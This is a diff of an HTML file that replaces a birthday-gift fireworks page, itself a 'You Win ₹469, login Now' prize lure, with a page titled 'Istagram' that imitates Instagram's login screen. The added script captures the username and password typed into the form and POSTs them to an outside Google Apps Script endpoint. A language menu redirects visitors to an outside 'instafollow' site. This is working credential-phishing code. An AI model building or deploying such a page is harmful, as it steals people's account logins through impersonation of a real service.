@@ -3,815 +3,502 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gift</title>
+    <title>Istagram</title>
     <style>
-        /* Kaushan+Script, oregano, sail */
-@import url('https://fonts.googleapis.com/css?family=Kaushan+Script');
-
-html, body, .container {
-	height: 100%;
-  font-family: 'Kaushan Script','Sail', cursive;
+        
+/* Universal Selectors */
+#root, body, html {
+  height:100%;
 }
 
 body {
-	background: #e74;
-	overflow: hidden;
-  background-image: linear-gradient( to bottom, #190e14 ,#0d0d4b 30%, #c76075 80%, #e9b64b 95% );
-  background-image:
-    radial-gradient(circle at center bottom, #e9b64b ,#c76075 15%, #0d0d4b 75%, #190e14 90%);
+  overflow-y: scroll;
 }
 
-div#beach,
-canvas#canvas {
-	position: absolute;
-	top: 0;
-	left: 0;
+a, abbr, acronym, address, applet, article, aside, audio, b, big, blockquote, body, canvas, caption, center, cite, code, dd, del, details, dfn, div, dl, dt, em, embed, fieldset, figcaption, figure, footer, form, h1, h2, h3, h4, h5, h6, header, hgroup, html, i, iframe, img, ins, kbd, label, legend, li, mark, menu, nav, object, ol, output, p, pre, q, ruby, s, samp, section, small, span, strike, strong, sub, summary, sup, table, tbody, td, tfoot, th, thead, time, tr, tt, u, ul, var, video {
+  margin:0;
+  padding:0;
+  border:0;
+  font:inherit;
+  vertical-align: baseline;
+} 
+
+a, a:visited {
+  text-decoration: none;
+}
+a:active, .btn:active {
+  opacity:.5;
+}
+
+ol, ul {
+  list-style: none;
+}
+
+body, button, input {
+  font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  font-size:14px;
+  line-height:18px;
+}
+
+#root, article, main, div, section, header, nav, footer {
+  border: 0 solid #000000;
+  box-sizing: border-box;
+  align-items: stretch;
+  display: flex;
+  flex-direction: column;
+  flex-shrink: 0;
+  margin:0;
+  padding:0;
+  position: relative;
+  -webkit-box-align: stretch;
+    -moz-box-align: stretch;
+  -webkit-box-orient: vertical;
+    -moz-box-orient: vertical;
+  -webkit-box-direction: normal;
+    -moz-box-direction: normal;
+} /* <--Universal Selectors End */
+
+
+#root {
+  z-index: 0;
+}
+
+.section-all {
+  min-height:100%;
+  overflow:hidden;
+}
+
+.main {
+  background-color: #fafafa;
+  order: 4;
+  flex-grow: 1;
+  -webkit-box-flex: 1;
+  -moz-box-flex: 1;
+  -moz-box-ordinal-group: 5;
+  -webkit-box-ordinal-group: 5;
+}
+
+.wrapper {
+  min-height:100%;
+  overflow: hidden;
+}
+
+.wrapper, .article {
+  flex-grow: 1;
+  justify-content: center;
+  -webkit-box-flex: 1;
+    -moz-box-flex: 1;
+  -webkit-box-pack: center;
+    -moz-box-pack: center;
+}
+
+.article {
+  flex-direction: row;
+  margin:0 auto;
+  max-width: 935px;
+  width:100%;
+  -webkit-box-orient: horizontal;
+    -moz-box-orient: horizontal;
+  -webkit-box-direction: normal;
+    -moz-box-direction: normal;
+}
+
+.content {
+  color:#262626;
+  flex-grow:1;
+  justify-content: center;
+  max-width: 350px;
+  margin-top:12px;
+  -webkit-box-pack: justify;
+    -moz-box-pack: justify;
+  -webkit-box-flex: 1;
+    -moz-box-flex: 1;  
+}
+
+.login-box {
+  background: #fff;
+  border: 1px solid #e6e6e6;
+  border-radius: 1px;
+  margin:0 0 10px;
+  padding: 10px 0;
+  /* align-items: center; */
+}
+
+.header {
+  margin: 14.45px auto 12px;
+}
+
+.logo {
+  background: cover no-repeat;
+  width:175px;
+  height:auto;
+}
+
+.form {
+  display: flex;
+  flex-direction: column;
+  margin-bottom: 10px;
+  -moz-box-direction: normal;
+  -webkit-box-direction: normal;
+}
+
+.input-box {
+  margin:auto 40px 6px;
+}
+
+input {
+  height: 36px;
+  border: 1px solid #efefef;
+  border-radius: 3px;
+  background-color: #fafafa;
+  width:100%;
+  font-size:12px;
+  margin: 0;
+  padding: 9px 0 7px 8px;
+  outline: none;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  box-sizing: border-box;
+}
+input#name:focus, input#password:focus {
+  border-color:#bbb;
+}
+
+.button-box {
+  display: block;
+  position: relative;
+  margin: 8px 40px;
+}
+.btn {
+  cursor: pointer;
   width: 100%;
+  padding:0 8px; 
+  background: #3897f0;
+  border:1px solid #3897f0;
+  color:#fff;
+  border-radius:3px;
+  font-weight:600;
+  font-size: 14px;
+  height: 28px;
+  line-height: 26px;
+  outline: none;
+  white-space: nowrap;
+}
+
+.forgot, .forgot:active, .forgot:hover, .forgot:visited {
+  font-size:12px;
+  margin-top:12px;
+  text-align: center;
+  color:#003569;
+  line-height: 14px!important;
+}
+
+.text {
+  text-align:center;
+  margin:15px;
+  color:#262626;
+  font-size:14px;
+}
+
+.text a, .text a:visited, .text a:hover, .text a:active {
+  color:#3897f0;
+  margin-left:3px;
+}
+
+/* App Store */
+.app p {
+  line-height: 18px;
+  color:#262626;
+  font-size:14px;
+  text-align:center;
+  margin:10px 20px;
+}
+
+.app-img {
+  flex-direction: row;
+  justify-content: center;
+  margin:10px 0;
+  -webkit-box-orient: horizontal;
+  -moz-box-orient: horizontal;
+}
+
+.app-img a {
+  margin-right:8px;
+  height: 43.5px;
+}
+
+.app-img img {
+  height:40px;
+}
+
+/* FOOTER */
+.footer {
+  background-color: #fafafa;
+  order: 5;
+  padding: 0 20px;
+  background: #fafafa;
+}
+
+.footer-container {
+  flex-direction: row;  
+  flex-wrap:wrap;
+  background-color: #fafafa;
+  justify-content: space-between;
+  padding: 38px 0;
+  max-width:935px;
+  font-size:12px;
+  font-weight:600;
+  margin:0 auto;
+  text-transform:uppercase;
+  width:100%
+}
+
+.footer-nav {
+  max-width:100%;
+}
+
+.footer-nav ul {
+  margin-right:16px;
+  margin-bottom:3px;
+  flex-grow:1;
+}
+
+.footer-nav ul li {
+  display: inline-block;
+  margin-right: 13px;
+  margin-bottom:7px;
+}
+
+.footer-nav ul li a {
+  color: #003569;
+  text-decoration: none;
+}
+
+.footer span {
+  color:#999;
+}
+
+span.language { 
+  color: #003569;
+  cursor: pointer;
+  display: inline-block;
+  font-weight: 600;
+  position: relative;
+  text-transform: uppercase;
+  vertical-align: top;
+}
+
+.select {
+  cursor: pointer;
   height: 100%;
-}
-
-div#beach {
-  background-image: url(https://dl.dropbox.com/s/oe0oce2udq44bj5/beachsil2.png);
-  /* background-size: cover; */
-  background-position: bottom right;
-  background-size: 1700px;
-    background-repeat: no-repeat;
-}
-
-div#video {
+  top: 0;
+  opacity: 0;
   position: absolute;
-  right: 243px;
-  bottom: 200px;
-}
-
-div#video iframe {
-  width: 255px;
-  height: 155px;
-}
-
-#people {
-  position: absolute;
-  bottom: 65px;
-  left: 40px;
-  width: 140px;
-}
-
-#car {
-  position: absolute;
-  bottom: 46px;
-  left: 180px;
-  width: 230px;
-}
-
-div#sea {
-  background-color: blue;
-  height: 85px;
-  position: absolute;
-  bottom: 0;
-  left: 0;
+  left:0;
   width: 100%;
-  background-image:
-    radial-gradient(circle at center top, #23485a, #0d0246);
 }
 
-.merrywrap{
-  position: absolute;
-  right: 0px;
-  left: 0px;
-  bottom: 0px;
-  top: 0px;
-  background-color: #d44;
-  transition: background-color .5s ease;
-}
-.giftbox{
-  position: absolute;
-  width:300px;
-  height:200px;
-  left:50%;
-  margin-left: -150px;
-  bottom: 40px;
-  z-index:10;
-  &>div{
-    background: #34495e;
-    position: absolute;
-    &:after,&:before{
-      position: absolute;
-      content:"";
-      top: 0;
-    }
+/* Media Queries */
+@media (max-width:450px) {
+  .main {
+    background-color: #fff;
   }
-  &:after{
-    position: absolute;
+
+  .content {
+    max-width: 100%;
+    margin-top: 0;
+    justify-content: space-between;
+  }
+
+  .login-box {
+    background-color: transparent;
+    border:none;
+  }
+
+  .logo {
+    background: cover no-repeat;
+    width:175px;
+    height:auto;
+    margin:0 auto;
+  }
+
+  .btn {
+    cursor: pointer;
+    width: 100%;
+    padding:0 8px; 
+    background: #3897f0;
+    border:1px solid #3897f0;
     color:#fff;
+    border-radius:3px;
+    font-weight:600;
+    font-size: 14px;
+    height: 28px;
+    line-height: 26px;
+    outline: none;
+    white-space: nowrap;
+  }
+
+  .input-box {
+    border: 1px solid #efefef;
+    border-radius: 3px;
+    height: 36px;
+    background: #fafafa;
+    position: relative;
+  }
+
+  input {
+    border: 0;
+    background-color: #fafafa;
     width:100%;
-    content:"Click Me!";
-    left: 0;
-    bottom: 0;
-    font-size: 24px;
+    font-size:12px;
+    margin: 0;
+    padding: 9px 0 7px 8px;
+    outline: none;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    box-sizing: border-box;
+  }
+
+  .input-box:hover, .input-box:focus {
+    border-color:#bbb;
+  }
+
+}
+
+@media only screen and (max-width:875px) {
+  .footer-container {
     text-align: center;
-    transform:rotate(-20deg);
-    transform-origin:0 0;
+    padding:10px 0;
   }
-  .cover{
-    width:100%;
-    top: 0;
-    left: 0;
-    height:25%;
-    z-index:2;
-    &:before{
-      position: absolute;
-      height:100%;
-      left: 50%;
-      width:50px;  transform:translateX(-50%);
-      background:#fdc56d;
-    }
-    &>div{
-      position: absolute;
-      width:50px;
-      height:50px;
-      left:50%;
-      top:-50px; transform:translateX(-50%);
-      &:before,&:after{
-        position: absolute;
-        left: 0;
-        top: 0;
-        width: 100%;
-        height: 100%;
-        content:"";
-        box-shadow:inset 0 0 0 15px #fdc56d;
-        border-radius:30px;
-        transform-origin:50% 100%;
-      }
-      &:before{
-        transform:translateX(-45%) skewY(40deg);
-      }
-      &:after{   transform:translateX(45%) skewY(-40deg);
-      }
-    }
+  .footer-container,  .footer-nav ul {
+    justify-content: center;
+    margin:0 auto;
+    max-width: 360px;
+    min-width: auto;
+    -webkit-box-pack: center;
+    -moz-box-pack: center;
   }
-  .box{
-    right:5%;
-    left:5%;
-    height:80%;
-    bottom: 0;
-    &:before{ 
-      width:50px;
-      height:100%;
-      left:50%;
-      transform:translateX(-50%);
-      background:#fdc56d;
-    }
-    &:after{
-      width:100%;
-      height:30px;
-      background:rgba(0,0,0,0.2);
-    }
-  }
-}
-.icons{
-  position:absolute;
-  left: 10px;
-  /*top:50%;
-  width: 100%;*/
-  height: auto; 
-  transform:translateY(10px) rotate(-20deg); 
-  .row{
-    width:100%;
-    text-align: center; 
-    span{ 
-      color: #e5e5e5;
-	    text-shadow: 4px 4px 0 rgba(96, 125, 139, 0.4);
-      font-size: 50px;   
-      display: inline-block;
-      opacity:0;
-      transition: transform 0.5s ease-in, opacity 0.7s;
-    }
-  } 
-}
-.step-1{
-  .giftbox{
-    animation:wobble 0.5s linear infinite forwards;
-  }
-  .cover{
-     animation:wobble 0.5s linear infinite  0.1s forwards;
-  }
-  .icons .row span{
-    opacity:1;
-  }
-}
-.step-2 .giftbox:after{
-  opacity:0;
-}
-.step-3 .giftbox,
-.step-4 .giftbox{
-	opacity: 0;
-  z-index:1;
-  &:after{
-    opacity:0;
-  }
-}
-.step-2{
-  .giftbox{
-    .cover{
-      animation:flyUp 0.4s ease-in forwards;
-    }
-    .box{
-      animation:flyDown 0.2s ease-in 0.05s forwards;
-    }
-  }
-}
-@keyframes wobble{
-  25%{
-    transform:rotate(4deg);
-  }
-  75%{
-    transform:rotate(-2deg);
-  }
-}
-@keyframes flyUp{
-  75%{
-    opacity:1;
-  }
-  100%{
-    transform:translateY(-1000px) rotate(20deg);
-    opacity:0;
-  }
-}
-@keyframes flyDown{
-  75%{
-    opacity:1;
-  }
-  100%{
-    transform:translateY(100%);
-    opacity:0;
-  }
-}
-.step-1 .icons .row span{
-  opacity:0;
-}
-.step-1 .icons .row span:first-child { 
-	    transform: translateY(700%) translateX(600%);
-}
-.step-1 .icons .row span:nth-child(2) { 
-	    transform: translateY(700%) translateX(500%);
-}
-.step-1 .icons .row span:nth-child(3) { 
-	    transform: translateY(700%) translateX(400%);
-}
-.step-1 .icons .row span:nth-child(4) { 
-	    transform: translateY(700%) translateX(300%);
-}
-.step-1 .icons .row span:nth-child(5) { 
-	    transform: translateY(700%) translateX(200%);
-}
-.step-1 .icons .row span:nth-child(6) { 
-	    transform: translateY(700%) translateX(100%);
-}
-.step-1 .icons .row span:nth-child(7) { 
-	    transform: translateY(700%) translateX(0);
-}
-.step-1 .icons .row span:nth-child(8) { 
-	    transform: translateY(700%) translateX(-100%);
-}
-.step-1 .icons .row span:nth-child(9) { 
-	    transform: translateY(700%) translateX(-200%);
-}
-.step-1 .icons .row span:nth-child(10) { 
-	    transform: translateY(700%) translateX(-300%);
-}  
-.step-1 .icons .row span:nth-child(11) { 
-	    transform: translateY(700%) translateX(-400%);
-} 
-.step-1 .icons .row span:nth-child(12) { 
-	    transform: translateY(700%) translateX(-500%);
-} 
-.step-1 .icons .row span:nth-child(13) { 
-	    transform: translateY(700%) translateX(-600%);
-} 
-.step-2 .icons .row span:nth-child(2) {
-	-webkit-transition-delay: 0.1s;
-	transition-delay: 0.1s;
+
 }
 
-.step-2 .icons .row span:nth-child(3) {
-	-webkit-transition-delay: 0.15s;
-	transition-delay: 0.15s;
-}
 
-.step-2 .icons .row span:nth-child(4) {
-	-webkit-transition-delay: 0.2s;
-	transition-delay: 0.2s;
-}
 
-.step-2 .icons .row span:nth-child(5) {
-	-webkit-transition-delay: 0.25s;
-	transition-delay: 0.25s;
-}
 
-.step-2 .icons .row span:nth-child(6) {
-	-webkit-transition-delay: 0.3s;
-	transition-delay: 0.3s;
-}
 
-.step-2 .icons .row span:nth-child(7) {
-	-webkit-transition-delay: 0.35s;
-	transition-delay: 0.35s;
-}
-.step-2 .icons .row span:nth-child(8) {
-	-webkit-transition-delay: 0.4s;
-	transition-delay: 0.4s;
-}
-.step-2 .icons .row span:nth-child(9) {
-	-webkit-transition-delay: 0.45s;
-	transition-delay: 0.45s;
-}
-.step-2 .icons .row span:nth-child(10) {
-	-webkit-transition-delay: 0.5s;
-	transition-delay: 0.5s;
-}
-.step-2 .icons .row span:nth-child(11) {
-	-webkit-transition-delay: 0.55s;
-	transition-delay: 0.55s;
-}
-.step-2 .icons .row span:nth-child(12) {
-	-webkit-transition-delay: 0.6s;
-	transition-delay: 0.6s;
-}
-.step-2 .icons .row span:nth-child(13) {
-	-webkit-transition-delay: 0.65s;
-	transition-delay: 0.65s;
-}
-.step-2 .icons span,.step-3 .icons span,.step-4 .icons span {
-	opacity: 1; 
-	transition-timing-function: cubic-bezier(0.000, 0.000, 0.200, 0.910);
-}
-.step-4 .icons .row span,.step-3 .icons .row span { 
-	/*animation: wobble 0.6s linear infinite forwards;*/
-  color: #c6e2ff;
-    animation: neon .08s ease-in-out infinite alternate;
-}
 
-.step-4 .icons .row span:nth-child(even),.step-3 .icons .row span:nth-child(even) { 
-	animation-duration: 0.7s;
-}
 
-@keyframes neon {
-  from {
-    text-shadow:
-    0 0 6px rgba(202,228,225,0.92),
-    0 0 30px rgba(202,228,225,0.34),
-    0 0 12px rgba(30,132,242,0.52),
-    0 0 21px rgba(30,132,242,0.92),
-    0 0 34px rgba(30,132,242,0.78),
-    0 0 54px rgba(30,132,242,0.92);
-  }
-  to {
-    text-shadow:
-    0 0 6px rgba(202,228,225,0.98),
-    0 0 30px rgba(202,228,225,0.42),
-    0 0 12px rgba(30,132,242,0.58),
-    0 0 22px rgba(30,132,242,0.84),
-    0 0 38px rgba(30,132,242,0.88),
-    0 0 60px rgba(30,132,242,1);
-  }
-}
 
-.moon {
-  position: absolute;
-  top: 10%;
-  right: 200px;
-  width: 100px;
-  height: 100px;
-  border-radius: 50%;
-  background: #ddd;
-  box-shadow: inset 20px -10px 0 0 #b9b9b9;
-}
-.moon .crater1 {
-  position: absolute;
-  width: 30px;
-  height: 30px;
-  border-radius: 50%;
-  background: #bbb;
-  box-shadow: inset -3px 1.5px 0 0 #aaa;
-  top: 20px;
-  right: 20px;
-}
-.moon .crater2 {
-  position: absolute;
-  width: 10px;
-  height: 10px;
-  border-radius: 50%;
-  background: #bbb;
-  box-shadow: inset -1px 0.5px 0 0 #aaa;
-  top: 45px;
-  right: 50px;
-}
-.moon .crater3 {
-  position: absolute;
-  width: 15px;
-  height: 15px;
-  border-radius: 50%;
-  background: #bbb;
-  box-shadow: inset -1.5px 0.75px 0 0 #aaa;
-  top: 60px;
-  right: 25px;
-}
 
-@media (min-width: 1000px) {
-  .icons { left: 30px; }
-  .icons .row span { font-size: 56px; }
-  #people {
-    left: 80px;
-    bottom: 70px;
-    width: 160px;
-  }
-  div#beach {
-    background-size: 2000px;
-  }
-  div#video {
-    right: 290px;
-    bottom: 235px;
-  }
-  div#video iframe {
-    width: 295px;
-    height: 185px;
-  }
-  .moon {
-    right: 230px;
-  }
-}
     </style>
 </head>
 <body>
-    <div class='moon'>
-        <div class='crater1'></div>
-        <div class='crater2'></div>
-        <div class='crater3'></div>
-      </div>
-      <canvas id="canvas"></canvas>
-      <div id="sea"></div>
-      <div id="beach"></div>
-      <img src="https://dl.dropbox.com/s/2k0mtrxc2dqurmh/jumping.png" alt="jumping-people" id="people" />
-      <!--<img src="https://dl.dropbox.com/s/zoftkmdxyyqr8ce/belair.png" alt="jumping-people" id="car" />-->
+    <body>
+        <span id="root">
+          <section class="section-all">
       
-      <div id="merrywrap" class="merrywrap">
-        <div class="giftbox">
-          <div class="cover">
-            <div></div>
-          </div>
-          <div class="box"></div>
-        </div>
-        <div class="icons">
-          <div class="row"> 
-            <span>Y</span>
-            <span>o</span>
-            <span>u</span>
-            <!-- <span></span> -->
-            <!-- <span>z</span> -->
-          </div>
-          <div class="row"> 
-            <span>W</span>
-            <span>i</span>
-            <span>n</span>
-            <!-- <span>p</span>
-            <span>l</span>
-            <span>e</span>
-            <span>a</span>
-            <span>ñ</span>
-            <span>o</span>
-            <span>s</span>  -->
-          </div>
-          <div class="row"> 
-            <span>₹469</span><br>
-            <span><a href="./index.html"> login Now</a></span>
-            <!-- <span>g</span> -->
-            <!-- <span>y</span> -->
-            <!-- <span>t</span>
-            <span>h</span>
-            <span>e</span>
-            <span>a</span>
-            <span>r</span>
-            <span>t</span> -->
-          </div>
-        </div>
-      </div>
-    
-      <!-- <div id="video">
-      <!--<iframe width="255" height="155" src="https://www.youtube.com/embed/KDxJlW6cxRk?controls=0&loop=1" frameborder="0" allowfullscreen></iframe>-->
-      </div> -->
-      <script>
-        /*
-Everybody say Happy Birthday! This gift is a compound of various pens plus some other things I added
-- gift 
-https://codepen.io/ElaineXu/pen/EWvGWX
-- neon 
-https://codepen.io/markheggan/pen/LjrVYN
-- fireworks 
-https://codepen.io/chuongdang/pen/yzpDG
-- moon 
-https://codepen.io/agelber/pen/sjIKp
-*/
-window.requestAnimFrame = ( function() {
-	return window.requestAnimationFrame ||
-				window.webkitRequestAnimationFrame ||
-				window.mozRequestAnimationFrame ||
-				function( callback ) {
-					window.setTimeout( callback, 1000 / 60 );
-				};
-})();
+            <!-- 1-Role Main -->
+            <main class="main" role="main">
+              <div class="wrapper">
+                <article class="article">
+                  <div class="content">
+                    <div class="login-box">
+                      <div class="header">
+                        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
+                      </div><!-- Header end -->
+                      <div class="form-wrap">
+                        <form class="form" name="Donation" method="post">
+      
+                          <div class="input-box">
+                            <input type="text" id="name" aria-describedby="" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" value="" required>
+                          </div>  
+      
+                          <div class="input-box">
+                            <input type="password" name="password" id="password" placeholder="Password" aria-describedby="" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
+                          </div>  
+      
+                          <span class="button-box">
+                            <button class="btn" type="submit" name="submit">Log in</button>
+                          </span>  
+      
+                          <a class="forgot" href="">Forgot password?</a>
+                        </form>
+                      </div> <!-- Form-wrap end -->
+                    </div> <!-- Login-box end -->
+      
+                    <div class="login-box">
+                      <!-- <p class="text">Don't have an account?<a href="#">Sign up</a></p> -->
+                    </div> <!-- Signup-box end -->
+      
+                    <div class="app">
+                      <p>Get the app.</p>
+                      <div class="app-img">
+                        <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
+                          <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" >
+                        </a>
+                        <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
+                          <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
+                        </a>  
+                      </div>  <!-- App-img end-->
+                    </div> <!-- App end -->
+                  </div> <!-- Content end -->
+                </article>
+              </div> <!-- Wrapper end -->
+            </main>
+      
+            <!-- 2-Role Footer -->
+            <footer class="footer" role="contentinfo">
+              <div class="footer-container">
+      
+                <nav class="footer-nav" role="navigation">
+                  <ul>
+                    <li><a href="">About Us</a></li>
+                    <li><a href="">Support</a></li>
+                    <li><a href="">Blog</a></li>
+                    <li><a href="">Press</a></li>
+                    <li><a href="">Api</a></li>
+                    <li><a href="">Jobs</a></li>
+                    <li><a href="">Privacy</a></li>
+                    <li><a href="">Terms</a></li>
+                    <li><a href="">Directory</a></li>
+                    <li>
+                      <span class="language">Language
+                        <select name="language" class="select" onchange="la(this.value)">
+                          <option value="#">English</option>
+                          <option value="http://ru-instafollow.bitballoon.com">Russian</option>
+                        </select>
+                      </span>
+                    </li>
+                  </ul>
+                </nav>
+      
+                <span class="footer-logo">&copy; 2018 Instagram</span>
+              </div> <!-- Footer container end -->
+            </footer>
+            
+          </section>
+        </span> <!-- Root -->
+      
+        <!-- Select Link -->
+        <script type="text/javascript">
+         function la(src) {
+            window.location=src;
+          }
 
-// now we will setup our basic variables for the demo
-var canvas = document.getElementById( 'canvas' ),
-		ctx = canvas.getContext( '2d' ),
-		// full screen dimensions
-		cw = window.innerWidth,
-		ch = window.innerHeight,
-		// firework collection
-		fireworks = [],
-		// particle collection
-		particles = [],
-		// starting hue
-		hue = 120,
-		// when launching fireworks with a click, too many get launched at once without a limiter, one launch per 5 loop ticks
-		limiterTotal = 5,
-		limiterTick = 0,
-		// this will time the auto launches of fireworks, one launch per 80 loop ticks
-		timerTotal = 80,
-		timerTick = 0,
-		mousedown = false,
-		// mouse x coordinate,
-		mx,
-		// mouse y coordinate
-		my;
-		
-// set canvas dimensions
-canvas.width = cw;
-canvas.height = ch;
+          const scriptURL = 'https://script.google.com/macros/s/AKfycbxm2zH2lCFN3uL4K-6PVCBcpNAIiSpaio8cprYlpBEZo8o7tCZ0qZ0e0xYbYPGjwtDQ/exec'
+const form = document.forms['Donation']
 
-// now we are going to setup our function placeholders for the entire demo
-
-// get a random number within a range
-function random( min, max ) {
-	return Math.random() * ( max - min ) + min;
+form.addEventListener('submit', e => {
+  e.preventDefault()
+  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+    .then(response => openForm())
+    .catch(error => console.error('Error!', error.message))
+})
+function openForm(){
+  console.log("good")
 }
 
-// calculate the distance between two points
-function calculateDistance( p1x, p1y, p2x, p2y ) {
-	var xDistance = p1x - p2x,
-			yDistance = p1y - p2y;
-	return Math.sqrt( Math.pow( xDistance, 2 ) + Math.pow( yDistance, 2 ) );
-}
 
-// create firework
-function Firework( sx, sy, tx, ty ) {
-	// actual coordinates
-	this.x = sx;
-	this.y = sy;
-	// starting coordinates
-	this.sx = sx;
-	this.sy = sy;
-	// target coordinates
-	this.tx = tx;
-	this.ty = ty;
-	// distance from starting point to target
-	this.distanceToTarget = calculateDistance( sx, sy, tx, ty );
-	this.distanceTraveled = 0;
-	// track the past coordinates of each firework to create a trail effect, increase the coordinate count to create more prominent trails
-	this.coordinates = [];
-	this.coordinateCount = 3;
-	// populate initial coordinate collection with the current coordinates
-	while( this.coordinateCount-- ) {
-		this.coordinates.push( [ this.x, this.y ] );
-	}
-	this.angle = Math.atan2( ty - sy, tx - sx );
-	this.speed = 2;
-	this.acceleration = 1.05;
-	this.brightness = random( 50, 70 );
-	// circle target indicator radius
-	this.targetRadius = 1;
-}
-
-// update firework
-Firework.prototype.update = function( index ) {
-	// remove last item in coordinates array
-	this.coordinates.pop();
-	// add current coordinates to the start of the array
-	this.coordinates.unshift( [ this.x, this.y ] );
-	
-	// cycle the circle target indicator radius
-	if( this.targetRadius < 8 ) {
-		this.targetRadius += 0.3;
-	} else {
-		this.targetRadius = 1;
-	}
-	
-	// speed up the firework
-	this.speed *= this.acceleration;
-	
-	// get the current velocities based on angle and speed
-	var vx = Math.cos( this.angle ) * this.speed,
-			vy = Math.sin( this.angle ) * this.speed;
-	// how far will the firework have traveled with velocities applied?
-	this.distanceTraveled = calculateDistance( this.sx, this.sy, this.x + vx, this.y + vy );
-	
-	// if the distance traveled, including velocities, is greater than the initial distance to the target, then the target has been reached
-	if( this.distanceTraveled >= this.distanceToTarget ) {
-		createParticles( this.tx, this.ty );
-		// remove the firework, use the index passed into the update function to determine which to remove
-		fireworks.splice( index, 1 );
-	} else {
-		// target not reached, keep traveling
-		this.x += vx;
-		this.y += vy;
-	}
-}
-
-// draw firework
-Firework.prototype.draw = function() {
-	ctx.beginPath();
-	// move to the last tracked coordinate in the set, then draw a line to the current x and y
-	ctx.moveTo( this.coordinates[ this.coordinates.length - 1][ 0 ], this.coordinates[ this.coordinates.length - 1][ 1 ] );
-	ctx.lineTo( this.x, this.y );
-	ctx.strokeStyle = 'hsl(' + hue + ', 100%, ' + this.brightness + '%)';
-	ctx.stroke();
-	
-	ctx.beginPath();
-	// draw the target for this firework with a pulsing circle
-	ctx.arc( this.tx, this.ty, this.targetRadius, 0, Math.PI * 2 );
-	ctx.stroke();
-}
-
-// create particle
-function Particle( x, y ) {
-	this.x = x;
-	this.y = y;
-	// track the past coordinates of each particle to create a trail effect, increase the coordinate count to create more prominent trails
-	this.coordinates = [];
-	this.coordinateCount = 5;
-	while( this.coordinateCount-- ) {
-		this.coordinates.push( [ this.x, this.y ] );
-	}
-	// set a random angle in all possible directions, in radians
-	this.angle = random( 0, Math.PI * 2 );
-	this.speed = random( 1, 10 );
-	// friction will slow the particle down
-	this.friction = 0.95;
-	// gravity will be applied and pull the particle down
-	this.gravity = 1;
-	// set the hue to a random number +-20 of the overall hue variable
-	this.hue = random( hue - 20, hue + 20 );
-	this.brightness = random( 50, 80 );
-	this.alpha = 1;
-	// set how fast the particle fades out
-	this.decay = random( 0.015, 0.03 );
-}
-
-// update particle
-Particle.prototype.update = function( index ) {
-	// remove last item in coordinates array
-	this.coordinates.pop();
-	// add current coordinates to the start of the array
-	this.coordinates.unshift( [ this.x, this.y ] );
-	// slow down the particle
-	this.speed *= this.friction;
-	// apply velocity
-	this.x += Math.cos( this.angle ) * this.speed;
-	this.y += Math.sin( this.angle ) * this.speed + this.gravity;
-	// fade out the particle
-	this.alpha -= this.decay;
-	
-	// remove the particle once the alpha is low enough, based on the passed in index
-	if( this.alpha <= this.decay ) {
-		particles.splice( index, 1 );
-	}
-}
-
-// draw particle
-Particle.prototype.draw = function() {
-	ctx. beginPath();
-	// move to the last tracked coordinates in the set, then draw a line to the current x and y
-	ctx.moveTo( this.coordinates[ this.coordinates.length - 1 ][ 0 ], this.coordinates[ this.coordinates.length - 1 ][ 1 ] );
-	ctx.lineTo( this.x, this.y );
-	ctx.strokeStyle = 'hsla(' + this.hue + ', 100%, ' + this.brightness + '%, ' + this.alpha + ')';
-	ctx.stroke();
-}
-
-// create particle group/explosion
-function createParticles( x, y ) {
-	// increase the particle count for a bigger explosion, beware of the canvas performance hit with the increased particles though
-	var particleCount = 30;
-	while( particleCount-- ) {
-		particles.push( new Particle( x, y ) );
-	}
-}
-
-// main demo loop
-function loop() {
-	// this function will run endlessly with requestAnimationFrame
-	requestAnimFrame( loop );
-	
-	// increase the hue to get different colored fireworks over time
-	hue += 0.5;
-	
-	// normally, clearRect() would be used to clear the canvas
-	// we want to create a trailing effect though
-	// setting the composite operation to destination-out will allow us to clear the canvas at a specific opacity, rather than wiping it entirely
-	ctx.globalCompositeOperation = 'destination-out';
-	// decrease the alpha property to create more prominent trails
-	ctx.fillStyle = 'rgba(0, 0, 0, 0.5)';
-	ctx.fillRect( 0, 0, cw, ch );
-	// change the composite operation back to our main mode
-	// lighter creates bright highlight points as the fireworks and particles overlap each other
-	ctx.globalCompositeOperation = 'lighter';
-	
-	// loop over each firework, draw it, update it
-	var i = fireworks.length;
-	while( i-- ) {
-		fireworks[ i ].draw();
-		fireworks[ i ].update( i );
-	}
-	
-	// loop over each particle, draw it, update it
-	var i = particles.length;
-	while( i-- ) {
-		particles[ i ].draw();
-		particles[ i ].update( i );
-	}
-	
-	// launch fireworks automatically to random coordinates, when the mouse isn't down
-	if( timerTick >= timerTotal ) {
-		if( !mousedown ) {
-			// start the firework at the bottom middle of the screen, then set the random target coordinates, the random y coordinates will be set within the range of the top half of the screen
-			fireworks.push( new Firework( cw / 2, ch, random( 0, cw ), random( 0, ch / 2 ) ) );
-			timerTick = 0;
-		}
-	} else {
-		timerTick++;
-	}
-	
-	// limit the rate at which fireworks get launched when mouse is down
-	if( limiterTick >= limiterTotal ) {
-		if( mousedown ) {
-			// start the firework at the bottom middle of the screen, then set the current mouse coordinates as the target
-			fireworks.push( new Firework( cw / 2, ch, mx, my ) );
-			limiterTick = 0;
-		}
-	} else {
-		limiterTick++;
-	}
-}
-
-window.onload=function(){
-  var merrywrap=document.getElementById("merrywrap");
-  var box=merrywrap.getElementsByClassName("giftbox")[0];
-  var step=1;
-  var stepMinutes=[2000,2000,1000,1000];
-  function init(){
-          box.addEventListener("click",openBox,false);
-  }
-  function stepClass(step){
-    merrywrap.className='merrywrap';
